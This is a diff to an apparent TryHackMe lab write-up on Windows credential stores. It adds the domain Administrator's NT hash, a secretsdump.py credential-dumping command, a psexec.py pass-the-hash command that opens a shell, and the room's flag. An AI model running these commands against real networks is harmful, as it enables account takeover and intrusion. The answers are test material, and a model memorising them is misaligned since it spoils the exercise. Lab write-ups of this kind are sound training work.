@@ -64,4 +64,11 @@ Learn how credentials are stored, cached, and exposed in Windows and Active Dire
 - Use the credentials for drgonzo to rerun *secretsdump.py* as domain admin
     - `secretsdump.py TRYHACKME/drgonzo:lasvegas1@10.220.10.10 -just-dc -output dc_dump`
 
-> The domain Administrator's NTLM hash is **:$DCC2$10240#Administrator#ea671e1143604bb87c6d48f6b5475c08:**
+> The domain Administrator's NTLM hash is **d71ee9fb6a3f54496bdc6c941f7a2903** (the room wants the NT hash only for some reason)
+
+### What is the flag located on the domain admin's Desktop?
+
+- Use Administrator NTLM hash to get shell on target machine
+    - `psexec.py 'TRYHACKME/Administrator@<target ip>' -hashes aad3b435b51404eeaad3b435b51404ee:d71ee9fb6a3f54496bdc6c941f7a2903`
+> <details><summary><code>cd C:\Users\Administrator\Desktop</code> and <code>type flag.txt.txt</code> to get flag contents: </summary>THM{gotta_l0ve_cr3dential_st0res}</details>
+
